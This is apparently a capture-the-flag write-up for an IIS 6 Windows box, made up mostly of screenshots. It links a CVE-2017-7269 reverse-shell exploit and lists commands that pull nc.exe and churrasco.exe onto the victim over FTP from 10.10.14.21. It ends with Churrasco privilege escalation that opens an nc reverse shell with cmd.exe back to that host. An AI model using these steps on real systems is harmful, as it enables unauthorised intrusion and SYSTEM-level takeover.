1.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/da3d72c6-9900-430d-afd4-795a51ba1346)

2. [link](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/62b52c60-3da9-4581-85ed-1f7a1f8560fe)

Attacker terminal:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4065cdff-e018-4983-83a2-fca55b2b39ee)

3.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/07594dc1-466d-49ac-9ef8-2a2e0da60ba4)

4. [article](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e)

Command: wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe?raw=true

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/143503d5-d126-4c6b-b26a-691a09ffbcf4)

5.

Command: cp /usr/share/windows-resources/binaries/nc.exe .

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a9732d71-b1e8-4cb0-92f9-cb6dcfb46847)

6.

Command: echo open 10.10.14.21 21> payloadftp.txt&echo USER anonymous >> payloadftp.txt&echo anonymous>> payloadftp.txt&echo bin>> payloadftp.txt&echo GET nc.exe >> payloadftp.txt&echo bye>> payloadftp.txt

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a2d2624d-57f8-4760-ac59-32d63bfbad2d)

7.

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d10ef698-5f6a-408c-a574-5c054ec74282)


8.

Attacker Terminal:<br>
Command:python3 -m pyftpdlib -p 21<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/021e26cc-6559-44c3-9e56-5b881ab224e4)


Victim Terminal:<br>
Command: ftp -v -n -s:payloadftp.txt<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/01e81fcc-d7f8-40f1-88dc-854620ba3082)

9.

Command: echo open 10.10.14.21 21> payloadftp.txt&echo USER anonymous >> payloadftp.txt&echo anonymous>> payloadftp.txt&echo bin>> payloadftp.txt&echo GET churrasco.exe >> payloadftp.txt&echo bye>> payloadftp.txt

Command 2: ftp -v -n -s:payloadftp.txt<br>

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6cc52aed-d435-4301-9481-6416e552f63a)

10.

Command: churrasco.exe -d "C:\wmpub\nc.exe 10.10.14.21 778 -e cmd.exe"

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e125371c-0b6c-47d5-a7b9-aaaa0b89b20e)

Attacker Terminal:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/24a046de-62a9-4243-8d0a-30242d7d33b9)

11.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/230ff785-5022-4405-a0bc-50c1cd4cd06c)

12.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/38c1dd15-3a6c-45f3-a243-ab238efd35af)








